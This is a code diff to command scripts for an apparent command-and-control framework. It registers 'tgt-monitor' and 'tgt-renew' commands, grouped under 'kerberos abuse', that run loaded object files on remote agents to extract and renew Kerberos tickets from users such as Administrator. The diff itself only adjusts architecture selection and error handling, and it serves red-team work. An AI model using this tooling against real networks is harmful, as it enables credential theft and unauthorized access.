@@ -1,12 +1,7 @@
 import conquest
 import os.path
 
-ASYNC_DLL = conquest.resources_root() + "/async-bof-loader/dist/async-bof.dll"
-EXPORT_FUNC = "Run"
 SCRIPT_DIR = os.path.dirname(__file__)
-
-if not os.path.exists(ASYNC_DLL):
-    raise FileNotFoundError(f"Async BOF DLL not found: {ASYNC_DLL}")
     
 cmd_tgtMonitor = (
     conquest.createCommand(name="tgt-monitor", description="Monitor for new Kerberos TGTs and automatically extract them as they appear (async).", example="tgt-monitor --interval 5 --user DC01$,Administrator",
@@ -17,14 +12,16 @@ cmd_tgtMonitor = (
                 interval := conquest.get_int(args, 0),
                 user := conquest.get_string(args, 1),
 
-                bof := os.path.join(SCRIPT_DIR, "tgt-monitor.x64.o"),
+                bof := os.path.join(SCRIPT_DIR, f"tgt-monitor.{conquest.arch(agentId)}.o"),
                 params := conquest.bof_pack("iz", [
                     interval,       # i: Polling interval
                     user,           # z: Target user
                 ]),
 
-                conquest.execute_alias(agentId, cmdline, f"dll {ASYNC_DLL} {EXPORT_FUNC} {conquest.async_bof_pack(bof, params)}") if os.path.exists(bof)
-                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
+                dll := conquest.resources_root() + f"/async-bof-loader/dist/async-bof.{conquest.arch(agentId)}.dll",
+                conquest.execute_alias(agentId, cmdline, f"dll {dll} Run {conquest.async_bof_pack(bof, params)}") if os.path.exists(bof) and os.path.exists(dll)
+                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline) if not os.path.exists(bof)
+                else conquest.error(agentId, f"Async BOF DLL not found: {dll}", cmdline)
             ))
 ).registerToGroup("kerberos abuse")
 
@@ -43,7 +40,7 @@ cmd_tgtRenew = (
 
                 conquest.error(agentId, "Flags --user and --luid are mutually exclusive.", cmdline) if (user and luid)
                 else (
-                    bof := os.path.join(SCRIPT_DIR, "tgt-renew.x64.o"),
+                    bof := os.path.join(SCRIPT_DIR, f"tgt-renew.{conquest.arch(agentId)}.o"),
                     params := conquest.bof_pack("iizz", [
                         interval,       # i: Polling interval
                         threshold,      # i: Remaining lifetime threshold
@@ -51,8 +48,10 @@ cmd_tgtRenew = (
                         luid            # z: Target LUIDs 
                     ]),
 
-                    conquest.execute_alias(agentId, cmdline, f"dll {ASYNC_DLL} {EXPORT_FUNC} {conquest.async_bof_pack(bof, params)}") if os.path.exists(bof)
-                    else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
+                    dll := conquest.resources_root() + f"/async-bof-loader/dist/async-bof.{conquest.arch(agentId)}.dll",
+                    conquest.execute_alias(agentId, cmdline, f"dll {dll} Run {conquest.async_bof_pack(bof, params)}") if os.path.exists(bof) and os.path.exists(dll)
+                    else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline) if not os.path.exists(bof)
+                    else conquest.error(agentId, f"Async BOF DLL not found: {dll}", cmdline)
                 )
             ))
 ).registerToGroup("kerberos abuse")
